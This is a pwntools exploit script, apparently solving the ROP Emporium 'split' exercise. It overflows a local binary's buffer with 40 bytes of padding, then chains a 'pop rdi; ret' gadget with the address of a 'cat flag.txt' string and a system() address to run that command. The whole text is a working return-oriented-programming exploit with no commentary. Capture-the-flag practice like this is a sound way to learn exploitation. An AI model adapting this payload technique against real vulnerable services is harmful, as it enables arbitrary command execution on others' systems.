from pwn import *

context.binary = binary = ELF('./split', checksec=False)
p = process()

offset = b'A' * 40
system_address = p64(0x0040074b)        
cat_flag_txt_file = p64(0x00601060)
pop_rdi_ret = p64(0x00000000004007c3)

payload = offset
payload += pop_rdi_ret 
payload += cat_flag_txt_file
payload += system_address

p.sendlineafter(b'>', payload)
p.interactive()
